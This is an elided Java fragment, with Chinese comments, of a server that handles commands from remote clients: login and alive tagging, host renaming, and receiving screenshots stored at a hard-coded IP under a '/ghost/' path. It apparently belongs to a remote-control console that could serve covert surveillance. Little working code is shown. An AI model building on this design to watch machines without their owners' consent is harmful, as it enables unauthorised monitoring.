    ...
    public void run() {
        try{
            ...
            while ((c=inputStreamReader.read())!=-1){
                ...
                if((char)c=='!'){
                    ...
                    switch (cmd[0]){
                        ...
                        case "!name":{//此开关已过时，新版本的client使用info指令传输属性信息
                            ...
                            avai=true;
                            ConsoleMain.tagLog.addTag(this.hostName,"login");
                            ConsoleMain.tagLog.addTag(this.hostName,"alive");
                            ConsoleMain.tagLog.pack();
                            Out.putPrompt();
                            ConsoleMain.saveOnlineClients();
                            continue;
                        }
                        case "!version":{
                            if(cmd.length<2){
                        ...
                        case "!sendpicurl":{
                            try{
                                Out.say("HandleConn","获取到新截图,url:http://39.100.5.139/ghost/"+ ConsoleMain.fileReceiver.getRootPath()+cmd[1]);
                            }catch (Exception e){
                                ;
                            }
                            ConsoleMain.cmdProcessFinish();
                        ...
                        case "!info":{
                            ...
                            //检查是否要重命名
                            if (ConsoleMain.transCmd.renPlan.containsKey(hostName)) {
                                hostName = ConsoleMain.transCmd.renPlan.get(hostName);
                                ...
                                bufferedWriter.newLine();
                                bufferedWriter.flush();
                                ConsoleMain.tagLog.addTag(hostName,"login");
                ...
                //输出消息
                if(this.equals(ConsoleMain.focusedConn)){
